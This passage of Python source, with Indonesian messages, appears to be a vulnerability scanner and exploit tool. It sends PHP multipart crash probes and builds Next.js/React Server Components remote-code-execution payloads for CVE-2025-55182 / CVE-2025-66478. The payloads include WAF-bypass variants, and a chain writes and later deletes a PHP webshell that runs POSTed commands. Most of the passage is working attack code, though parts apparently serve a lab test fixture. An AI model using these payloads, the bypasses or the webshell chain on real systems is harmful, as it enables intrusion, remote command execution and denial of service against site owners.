) -> PhpHTTPResult:
    return await asyncio.wait_for(
        php_exchange_post(target_url, body, headers, timeout, verify_ssl),
        timeout=timeout,
    )


def php_should_retry(result: PhpHTTPResult) -> bool:
    if result.status_code in RETRYABLE_HTTP_STATUSES:
        return True
    return is_retryable_error(result.error)


def php_send_post(
    target_url: str,
    body: bytes,
    boundary: str,
    custom_headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
    retry: bool = True,
) -> PhpHTTPResult:
    attempts = max(0, RUNTIME.retries) + 1 if retry else 1
    result = PhpHTTPResult(bytes_sent=len(body))

    for attempt in range(attempts):
        RUNTIME.wait()
        result = PhpHTTPResult(bytes_sent=len(body))
        headers = php_request_headers(custom_headers, boundary)
        try:
            response = asyncio.run(
                php_timed_exchange_post(
                    target_url, body, headers, timeout, verify_ssl
                )
            )
            result.status_code = response.status_code
            result.reason = response.reason
            result.headers = response.headers
            result.body = response.body
        except ssl.SSLError as exc:
            result.error = tls_error_message(exc)
        except asyncio.TimeoutError:
            result.error = "permintaan timeout"
        except h11.RemoteProtocolError as exc:
            result.error = f"gagal membaca respons: {exc}"
        except (h11.LocalProtocolError, ValueError, UnicodeError) as exc:
            result.error = f"permintaan gagal: {exc}"
        except PhpHTTPTransportError as exc:
            result.error = f"gagal membaca respons: {exc}"
        except OSError as exc:
            result.error = f"kesalahan koneksi: {exc}"

        if attempt + 1 >= attempts or not php_should_retry(result):
            return result
        RUNTIME.backoff(attempt, retry_after_seconds(result.headers))

    return result


def php_version_verdict(powered_by: str) -> Optional[str]:
    match = PHP_VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(value) for value in match.groups())
    fixed_patch = PHP_FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def php_crash_signal(
    control: PhpHTTPResult,
    probe: PhpHTTPResult,
    sapi: str,
    differential: Optional[PhpHTTPResult] = None,
) -> Tuple[Optional[str], Optional[str]]:
    mode = php_sapi_mode(sapi)
    if (
        b"Allowed memory size of " in probe.body
        and b" bytes exhausted" in probe.body
        and b"Unknown" in probe.body
    ):
        return (
            mode,
            "fatal error PHP in-band (memori habis di Unknown) muncul saat "
            "mem-parsing body multipart",
        )

    if not php_response_alive(differential):
        return None, None

    if probe.error and php_transport_error_is_reset(probe.error):
        return (
            mode,
            f"koneksi terputus pada probe ({probe.error}) dan kontrol valid "
            "multipart ukuran sama tetap berhasil",
        )

    if probe.status_code in (502, 503, 504) and sapi != "mod_php":
        return (
            "PHP-FPM",
            f"HTTP {probe.status_code} pada probe dan kontrol valid multipart "
            "ukuran sama tetap berhasil (worker crash/restart)",
        )

    if probe.status_code == 500 and not probe.body:
        return (
            mode,
            "HTTP 500 dengan body kosong pada probe, tetapi kontrol valid "
            "multipart ukuran sama berhasil",
        )

    if (
        probe.status_code == 200
        and not probe.body
        and php_response_ok_with_body(differential)
    ):
        return (
            mode,
            "HTTP 200 dengan body kosong pada probe, tetapi kontrol valid "
            "multipart ukuran sama menghasilkan respons normal",
        )

    return None, None


def php_describe_response(response: PhpHTTPResult) -> str:
    if response.error:
        return (
            f"permintaan gagal setelah mengirim {response.bytes_sent} byte: "
            f"{response.error}"
        )
    return (
        f"HTTP {response.status_code}, respons {len(response.body)} byte "
        f"(mengirim {response.bytes_sent} byte)"
    )


def php_response_dump(response: PhpHTTPResult) -> Optional[str]:
    if response.status_code is None:
        return None
    lines = [f"HTTP/1.1 {response.status_code} {response.reason}".rstrip()]
    lines.extend(
        f"{name}: {redact_header(name, value)}"
        for name, value in response.headers.items()
    )
    excerpt = response.body[:PHP_EXCERPT_LIMIT].decode("utf-8", errors="replace")
    return "\r\n".join(lines) + "\r\n\r\n" + excerpt


def php_request_dump(
    target_url: str,
    headers: Dict[str, str],
    body_size: int,
    description: str,
) -> str:
    parsed: SplitResult = urlsplit(target_url)
    request_target = parsed.path or "/"
    if parsed.query:
        request_target += "?" + parsed.query
    if RUNTIME.proxy is not None and parsed.scheme == "http":
        request_target = f"{parsed.scheme}://{parsed.netloc}{request_target}"
    host = header_value(headers, "Host") or parsed.netloc
    lines = [f"POST {request_target} HTTP/1.1", f"Host: {host}"]
    lines.extend(
        f"{name}: {redact_header(name, value)}"
        for name, value in headers.items()
        if name.lower() != "host"
    )
    if (
        RUNTIME.proxy is not None
        and parsed.scheme == "http"
        and RUNTIME.proxy.authorization
    ):
        lines.append("Proxy-Authorization: <redacted>")
    lines.append(f"Content-Length: {body_size}")
    return "\r\n".join(lines) + f"\r\n\r\n<{description}; {body_size} byte>"


def php_base_result(host: str) -> dict:
    return {
        "engine": "php",
        "cve": PHP_CVES,
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "sapi": None,
        "powered_by": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "control": None,
        "differential": None,
        "differential_request": None,
        "suspicion": None,
        "skipped": False,
        "skip_reason": None,
        "probes": [],
        "timestamp": utc_now(),
    }


def php_apply_response(result: dict, response: PhpHTTPResult) -> None:
    result["status_code"] = response.status_code
    result["response"] = php_response_dump(response)


def php_response_metadata(response: PhpHTTPResult) -> dict:
    return {
        "status_code": response.status_code,
        "response_bytes": len(response.body),
        "bytes_sent": response.bytes_sent,
        "error": response.error,
        "description": php_describe_response(response),
    }


def php_check_url(
    host: str,
    target_url: str,
    timeout: int,
    verify_ssl: TLSVerify,
    custom_headers: Dict[str, str],
    sapi: str,
) -> dict:
    result = php_base_result(host)
    result["tested_url"] = target_url
    result["final_url"] = target_url

    control_headers = php_request_headers(custom_headers, PHP_CONTROL_BOUNDARY)
    control = php_send_post(
        target_url,
        PHP_CONTROL_BODY,
        PHP_CONTROL_BOUNDARY,
        custom_headers,
        timeout,
        verify_ssl,
    )
    result["request"] = php_request_dump(
        target_url,
        control_headers,
        len(PHP_CONTROL_BODY),
        "body multipart kontrol minimal",
    )
    php_apply_response(result, control)
    result["control"] = php_response_metadata(control)

    if control.error:
        result["error"] = f"permintaan kontrol gagal: {control.error}"
        result["reason"] = result["error"]
        return result
    if control.status_code is None or not 200 <= control.status_code < 300:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = (
            "permintaan kontrol tidak menghasilkan respons HTTP 2xx "
            f"(HTTP {control.status_code}); target tidak dapat diverifikasi"
        )
        result["reason"] = result["error"]
        return result

    if PHP_PHPMYADMIN_MARKER in control.body:
        target_url = phpmyadmin_target(target_url)
        result["final_url"] = target_url
        control = php_send_post(
            target_url,
            PHP_CONTROL_BODY,
            PHP_CONTROL_BOUNDARY,
            custom_headers,
            timeout,
            verify_ssl,
        )
        result["request"] = php_request_dump(
            target_url,
            control_headers,
            len(PHP_CONTROL_BODY),
            "body multipart kontrol minimal",
        )
        php_apply_response(result, control)
        result["control"] = php_response_metadata(control)
        if control.error:
            result["error"] = (
                f"permintaan kontrol phpMyAdmin gagal: {control.error}"
            )
            result["reason"] = result["error"]
            return result
        if control.status_code is None or not 200 <= control.status_code < 300:
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = (
                "permintaan kontrol phpMyAdmin tidak menghasilkan HTTP 2xx "
                f"(HTTP {control.status_code})"
            )
            result["reason"] = result["error"]
            return result

    powered_by = control.powered_by
    result["powered_by"] = powered_by or None
    by_version = php_version_verdict(powered_by)
    if by_version == "FIXED":
        result["vulnerable"] = False
        result["verdict"] = "FIXED"
        result["reason"] = (
            "X-Powered-By sudah menunjukkan rilis yang dipatch: " + powered_by
        )
        return result

    rejected = False
    rejected_reason = None
    suspicion = None

    for index, (size_mib, parts) in enumerate(PHP_PROBES, start=1):
        body = php_build_probe_body(size_mib, parts)
        probe_headers = php_request_headers(custom_headers, PHP_PROBE_BOUNDARY)
        probe = php_send_post(
            target_url,
            body,
            PHP_PROBE_BOUNDARY,
            custom_headers,
            timeout,
            verify_ssl,
            retry=False,
        )
        probe_metadata = php_response_metadata(probe)
        probe_metadata.update(
            {"probe": index, "size_mib": size_mib, "parts": parts}
        )
        result["probes"].append(probe_metadata)
        result["request"] = php_request_dump(
            target_url,
            probe_headers,
            len(body),
            f"probe php2shell {index}: {size_mib} MiB, {parts} bagian, "
            f"{PHP_NESTED_KEYS} kunci bersarang",
        )
        php_apply_response(result, probe)

        if probe.powered_by:
            powered_by = probe.powered_by
        result["powered_by"] = powered_by or None
        by_version = php_version_verdict(powered_by)
        if by_version == "FIXED":
            result["vulnerable"] = False
            result["verdict"] = "FIXED"
            result["reason"] = (
                "X-Powered-By sudah menunjukkan rilis yang dipatch: "
                + powered_by
            )
            return result

        if probe.error:
            if php_transport_error_is_timeout(probe.error):
                suspicion = (
                    f"probe {index} timeout sebelum respons dibaca: "
                    f"{probe.error}"
                )
                break
            if not php_transport_error_is_reset(probe.error):
                suspicion = (
                    f"probe {index} gagal sebelum respons dibaca: "
                    f"{probe.error}"
                )
                break

        if probe.status_code in PHP_REJECTED_STATUSES:
            rejected = True
            rejected_reason = (
                f"probe {index} ditolak dengan HTTP {probe.status_code} "
                "sebelum diproses PHP"
            )
            break

        differential = None
        if php_probe_needs_differential(probe, sapi):
            differential_body = php_build_valid_control_body(len(body))
            differential_headers = php_request_headers(
                custom_headers, PHP_CONTROL_BOUNDARY
            )
            differential = php_send_post(
                target_url,
                differential_body,
                PHP_CONTROL_BOUNDARY,
                custom_headers,
                timeout,
                verify_ssl,
                retry=False,
            )
            differential_metadata = php_response_metadata(differential)
            differential_metadata.update(
                {"size_mib": size_mib, "kind": "valid-multipart"}
            )
            result["differential"] = differential_metadata
            result["differential_request"] = php_request_dump(
                target_url,
                differential_headers,
                len(differential_body),
                f"kontrol valid multipart {size_mib} MiB",
            )

        detected_sapi, signal = php_crash_signal(
            control, probe, sapi, differential=differential
        )
        if signal:
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            result["sapi"] = detected_sapi
            result["reason"] = (
                f"probe {index} ({size_mib} MiB, {parts} bagian) + kontrol "
                f"valid ukuran sama: {signal}"
            )
            return result

        if differential is not None:
            if differential.error:
                suspicion = (
                    f"probe {index} ({size_mib} MiB, {parts} bagian) "
                    f"mencurigakan, tetapi kontrol valid multipart gagal: "
                    f"{differential.error}"
                )
            elif not php_response_alive(differential):
                suspicion = (
                    f"probe {index} ({size_mib} MiB, {parts} bagian) "
                    f"mencurigakan, tetapi kontrol valid multipart membalas "
                    f"HTTP {differential.status_code}"
                )
            else:
                suspicion = (
                    f"probe {index} ({size_mib} MiB, {parts} bagian) "
                    "mencurigakan, tetapi kontrol valid multipart tidak "
                    "menunjukkan sinyal crash yang jelas"
                )
            break

    by_version = php_version_verdict(powered_by)
    result["powered_by"] = powered_by or None
    if by_version == "FIXED":
        result["vulnerable"] = False
        result["verdict"] = "FIXED"
        result["reason"] = (
            "tidak ada crash dan X-Powered-By menunjukkan rilis yang sudah "
            "dipatch: " + powered_by
        )
    elif rejected:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = rejected_reason
        result["reason"] = rejected_reason
    elif by_version == "VULNERABLE":
        result["vulnerable"] = True
        result["verdict"] = "VULNERABLE"
        result["sapi"] = (
            "unknown"
            if sapi == "auto"
            else "PHP-FPM"
            if sapi == "fpm"
            else "mod_php"
        )
        result["reason"] = (
            "tidak ada crash; X-Powered-By menunjukkan rilis yang belum "
            "dipatch: " + powered_by
        )
    elif suspicion:
        result["verdict"] = "INCONCLUSIVE"
        result["error"] = suspicion
        result["reason"] = suspicion
        result["suspicion"] = suspicion
    else:
        result["vulnerable"] = False
        result["verdict"] = "NO SIGNAL"
        result["reason"] = "tidak ada crash dan versi PHP tidak diungkapkan"
    return result


def php_check_vulnerability(
    host: str,
    timeout: int = PHP_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    sapi: str = "auto",
    paths: Optional[List[str]] = None,
) -> dict:
    display_host = safe_url_label(host)
    try:
        normalized = normalize_url(host, PHP_DEFAULT_PATH)
    except ValueError as exc:
        result = php_base_result(display_host)
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    targets = (
        [replace_path(normalized, path, PHP_DEFAULT_PATH) for path in paths]
        if paths
        else [normalized]
    )
    fallback: Optional[dict] = None
    fallback_priority = {
        "NO SIGNAL": 0,
        "FIXED": 1,
        "INCONCLUSIVE": 2,
        "ERROR": 2,
    }
    for target_url in targets:
        result = php_check_url(
            normalized,
            target_url,
            timeout,
            verify_ssl,
            custom_headers or {},
            sapi,
        )
        if result["vulnerable"] is True:
            return result
        if fallback is None or fallback_priority.get(
            result["verdict"], 0
        ) > fallback_priority.get(fallback["verdict"], 0):
            fallback = result
    return fallback or php_base_result(normalized)


def fingerprint_has_php_signal(fingerprint: dict) -> bool:
    for detail in fingerprint.get("tech_details") or []:
        if str(detail.get("name", "")).lower() == "php":
            return True
    for item in fingerprint.get("tech") or []:
        value = str(item).lower()
        if value == "php" or value.startswith("php/"):
            return True
    return False


def fingerprint_has_nextjs(fingerprint: dict) -> bool:
    for detail in fingerprint.get("tech_details") or []:
        if str(detail.get("name", "")).lower() == "next.js":
            return True
    return any(
        "next.js" in str(item).lower()
        for item in fingerprint.get("tech") or []
    )


def php_skip_reason(
    mode: str,
    paths: Optional[List[str]],
    fingerprint: Optional[dict],
) -> Optional[str]:
    if mode != "all" or not fingerprint:
        return None
    if fingerprint.get("blocked"):
        return None
    status_code = fingerprint.get("status_code")
    if status_code is None or not 200 <= status_code < 300:
        return None
    for path in paths or []:
        if urlsplit(path).path.lower().endswith(".php"):
            return None
    baseline_path = urlsplit(
        str(fingerprint.get("baseline_url") or "")
    ).path
    if baseline_path.lower().endswith(".php"):
        return None
    if fingerprint_has_php_signal(fingerprint):
        return None
    if not fingerprint_has_nextjs(fingerprint):
        return None
    return (
        "target terdeteksi Next.js tanpa indikator PHP; probe PHP tidak "
        "dijalankan pada mode all"
    )


def php_skipped_result(
    host: str, fingerprint: dict, reason: str
) -> dict:
    result = php_base_result(host)
    result["vulnerable"] = False
    result["verdict"] = "NOT APPLICABLE"
    result["status_code"] = fingerprint.get("status_code")
    result["reason"] = reason
    result["skipped"] = True
    result["skip_reason"] = reason
    baseline_url = fingerprint.get("baseline_url")
    result["tested_url"] = baseline_url
    result["final_url"] = baseline_url
    return result


# ---------------------------------------------------------------------------
# Engine React / Next.js: CVE-2025-55182 / CVE-2025-66478
# ---------------------------------------------------------------------------


def react_generate_junk_data(size_bytes: int) -> Tuple[str, str]:
    param_name = "".join(random.choices(string.ascii_lowercase, k=12))
    junk = "".join(
        random.choices(string.ascii_letters + string.digits, k=size_bytes)
    )
    return param_name, junk


def react_build_safe_payload() -> Tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        "{}\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        '["$1:aa:aa"]\r\n'
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def react_build_vercel_waf_bypass_payload() -> Tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def react_build_rce_payload(
    windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128
) -> Tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        cmd = 'powershell -c \\"41*271\\"'
    else:
        cmd = "echo $((41*271))"

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []
    if waf_bypass:
        param_name, junk = react_generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
    )
    parts.append(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        "[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


# ---------------------------------------------------------------------------
# Rantai e2e RCE -> webshell (poc_chain.py + engine "chain" di poc_lab.py)
# ---------------------------------------------------------------------------

# Token penanda di dalam body payload; dipakai fixture lab
# (tests/e2e_support.py) untuk membedakan tahap upload dan bersih-bersih
# dari probe RCE biasa.
CHAIN_UPLOAD_TOKEN = "POC_CHAIN_UPLOAD"
CHAIN_CLEANUP_TOKEN = "POC_CHAIN_CLEANUP"
CHAIN_UPLOAD_MARKER = "UPLOADED:"
CHAIN_SHELL_NAME_RE = re.compile(r"poc_shell_[0-9a-f]{8}\.php")
CHAIN_SHELL_SOURCE = "<?php @system($_POST['c']); ?>"


def react_chain_payload(js_code: str) -> Tuple[str, str]:
    """Bangun payload RCE dengan kode JavaScript kustom pada _prefix.

    Kode JS di-escape agar tetap valid sebagai string JSON bagian dalam
    payload multipart (pola yang sama dengan react_build_rce_payload).
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    escaped_prefix = js_code.replace("\\", "\\\\").replace('"', '\\"')
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + escaped_prefix
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    parts = [
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n',
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        "[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
    ]
    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def react_build_upload_payload(shell_name: str) -> Tuple[str, str]:
    """Rantai tahap 1: RCE menulis webshell via fs.writeFileSync.

    Sumber webshell PHP di-escape lewat json.dumps supaya aman disematkan
    sebagai string JS (memuat kutip) di dalam _prefix.
    """
    shell_literal = json.dumps(CHAIN_SHELL_SOURCE)
    js_code = (
        f"var pocChain='{CHAIN_UPLOAD_TOKEN}';"
        f"process.mainModule.require('fs').writeFileSync('{shell_name}', {shell_literal});"
        f"var res='{CHAIN_UPLOAD_MARKER}{shell_name}';"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )
    return react_chain_payload(js_code)


def react_build_delete_payload(shell_name: str) -> Tuple[str, str]:
    """Rantai tahap 4: RCE menghapus webshell via fs.unlinkSync."""
    js_code = (
        f"process.mainModule.require('fs').unlinkSync('{shell_name}');"
        f"var res='{CHAIN_CLEANUP_TOKEN}';"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )
    return react_chain_payload(js_code)


def react_is_vulnerable_rce_token(response: requests.Response, token: str) -> bool:
    """Generalisasi react_is_vulnerable_rce_check untuk token kustom."""
    redirect_header = response.headers.get("X-Action-Redirect", "")
    pattern = r".*/login\?a=" + re.escape(token) + ".*"
    return bool(re.search(pattern, redirect_header))


def react_chain_headers(content_type: str) -> Dict[str, str]:
    """Header untuk POST payload rantai (mengikuti react_check_vulnerability)."""
    headers = {
        "User-Agent": FINGERPRINT_USER_AGENT,
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    set_header(
        headers, "Accept-Encoding", BROWSER_DEFAULT_HEADERS["Accept-Encoding"]
    )
    return headers


def react_resolve_redirects(
    url: str,
    timeout: int,
    verify_ssl: TLSVerify,
    headers: Optional[Dict[str, str]] = None,
    max_redirects: int = 10,
) -> str:
    current_url = url
    original = urlsplit(url)
    original_host = original.netloc

    for _ in range(max_redirects):
        try:
            RUNTIME.wait()
            response = requests.head(
                current_url,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                proxies=request_proxies(),
            )
            location = response.headers.get("Location")
            response.close()
            if (
                response.status_code not in (301, 302, 303, 307, 308)
                or not location
            ):
                break
            next_url = urljoin(current_url, location)
            next_parsed = urlsplit(next_url)
            if next_parsed.scheme not in ("http", "https"):
                break
            if next_parsed.netloc != original_host:
                break
            if original.scheme == "https" and next_parsed.scheme != "https":
                break
            current_url = next_url
        except RequestException:
            break
    return current_url


def react_should_retry(
    response: Optional[requests.Response], error: Optional[str]
) -> bool:
    if response is not None and response.status_code in RETRYABLE_HTTP_STATUSES:
        return True
    return is_retryable_error(error)


def react_send_payload(
    target_url: str,
    headers: dict,
    body: str,
    timeout: int,
    verify_ssl: TLSVerify,
) -> Tuple[Optional[requests.Response], Optional[str]]:
    attempts = max(0, RUNTIME.retries) + 1
    response: Optional[requests.Response] = None
    error: Optional[str] = None
    body_bytes = body.encode("utf-8") if isinstance(body, str) else body

    for attempt in range(attempts):
        response = None
        error = None
        RUNTIME.wait()
        try:
            response = requests.post(
                target_url,
                headers=headers,
                data=body_bytes,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                stream=True,
                proxies=request_proxies(),
            )
            content = b""
            try:
                content = response.raw.read(
                    REACT_BODY_READ_LIMIT, decode_content=True
                )
            finally:
                response._content = content or b""
                response._content_consumed = True
                response.close()
        except requests.exceptions.SSLError as exc:
            error = tls_error_message(exc)
        except requests.exceptions.ConnectionError as exc:
            error = f"kesalahan koneksi: {exc}"
        except requests.exceptions.Timeout:
            error = REACT_TIMEOUT_MESSAGE
        except RequestException as exc:
            error = f"permintaan gagal: {exc}"
        except Exception as exc:
            error = f"kesalahan tak terduga: {exc}"

        if attempt + 1 >= attempts or not react_should_retry(response, error):
            return response, error

        retry_after = None
        if response is not None:
            retry_after = retry_after_seconds(
                {name: value for name, value in response.headers.items()}
            )
            response.close()
        RUNTIME.backoff(attempt, retry_after)

    return response, error


def react_is_vulnerable_safe_check(response: requests.Response) -> bool:
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary
        or server_header == "netlify"
        or server_header == "vercel"
    )
    return not is_mitigated


def react_is_vulnerable_rce_check(response: requests.Response) -> bool:
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r".*/login\?a=11111.*", redirect_header))


def react_base_result(host: str) -> dict:
    return {
        "engine": "react",
        "cve": REACT_CVES,
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "timestamp": utc_now(),
    }


def react_check_vulnerability(
    host: str,
    timeout: int = REACT_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    follow_redirects: bool = True,
    custom_headers: Optional[Dict[str, str]] = None,
    safe_check: bool = True,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    vercel_waf_bypass: bool = False,
    paths: Optional[List[str]] = None,
) -> dict:
    display_host = safe_url_label(host)
    result = react_base_result(display_host)

    try:
        normalized = normalize_url(host, REACT_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    result["host"] = normalized
    base_path = urlsplit(normalized).path or REACT_DEFAULT_PATH
    test_paths = paths if paths else [base_path]

    if safe_check:
        body, content_type = react_build_safe_payload()
        is_vulnerable = react_is_vulnerable_safe_check
    elif vercel_waf_bypass:
        body, content_type = react_build_vercel_waf_bypass_payload()
        is_vulnerable = react_is_vulnerable_rce_check
    else:
        body, content_type = react_build_rce_payload(
            windows=windows,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
        )
        is_vulnerable = react_is_vulnerable_rce_check

    headers = {
        "User-Agent": FINGERPRINT_USER_AGENT,
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    set_header(
        headers, "Accept-Encoding", BROWSER_DEFAULT_HEADERS["Accept-Encoding"]
    )
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)
    for name in ("Content-Length", "Transfer-Encoding"):
        for key in list(headers):
            if key.lower() == name.lower():
                del headers[key]
    set_header(headers, "Content-Type", content_type)

    body_bytes_length = len(body.encode("utf-8"))

    def build_request_str(url: str) -> str:
        parsed = urlparse(url)
        target = parsed.path or "/"
        if parsed.query:
            target += "?" + parsed.query
        request_str = f"POST {target} HTTP/1.1\r\n"
        request_str += f"Host: {parsed.netloc}\r\n"
        for key, value in headers.items():
            request_str += f"{key}: {redact_header(key, value)}\r\n"
        request_str += f"Content-Length: {body_bytes_length}\r\n\r\n"
        if len(body) > REACT_REQUEST_BODY_EXCERPT:
            request_str += (
                body[:REACT_REQUEST_BODY_EXCERPT]
                + f"\r\n<dipotong; total {body_bytes_length} byte>"
            )
        else:
            request_str += body
        return request_str

    def build_response_str(response: requests.Response) -> str:
        response_str = f"HTTP/1.1 {response.status_code} {response.reason}\r\n"
        for key, value in response.headers.items():
            response_str += f"{key}: {redact_header(key, value)}\r\n"
        response_str += f"\r\n{response.text[:2000]}"
        return response_str

    redirect_error: Optional[str] = None
    for idx, path in enumerate(test_paths):
        redirect_error = None
        path = path if path.startswith("/") else "/" + path
        test_url = replace_path(normalized, path, REACT_DEFAULT_PATH)

        result["tested_url"] = test_url
        result["final_url"] = test_url
        result["request"] = build_request_str(test_url)

        response, error = react_send_payload(
            test_url, headers, body, timeout, verify_ssl
        )

        if error:
            if idx < len(test_paths) - 1:
                continue
            result["error"] = error
            result["reason"] = error
            result["verdict"] = "ERROR"
            return result

        result["status_code"] = response.status_code
        result["response"] = build_response_str(response)

        if is_vulnerable(response):
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            result["reason"] = "indikator kerentanan ditemukan pada respons"
            return result

        if follow_redirects:
            try:
                redirect_url = react_resolve_redirects(
                    test_url, timeout, verify_ssl, headers
                )
                if redirect_url != test_url:
                    result["final_url"] = redirect_url
                    response, error = react_send_payload(
                        redirect_url, headers, body, timeout, verify_ssl
                    )
                    if error:
                        redirect_error = (
                            f"permintaan ke target redirect gagal: {error}"
                        )
                        if idx < len(test_paths) - 1:
                            continue
                        result["error"] = redirect_error
                        result["reason"] = redirect_error
                        result["verdict"] = "ERROR"
                        return result

                    result["request"] = build_request_str(redirect_url)
                    result["status_code"] = response.status_code
                    result["response"] = build_response_str(response)

                    if is_vulnerable(response):
                        result["vulnerable"] = True
                        result["verdict"] = "VULNERABLE"
                        result["reason"] = (
                            "indikator kerentanan ditemukan pada respons "
                            "setelah redirect"
                        )
                        return result
            except Exception as exc:
                redirect_error = f"gagal memproses redirect: {exc}"

    if redirect_error:
        result["error"] = redirect_error
        result["reason"] = redirect_error
        result["verdict"] = "ERROR"
        return result

    if result.get("status_code") in REACT_BLOCKED_STATUSES:
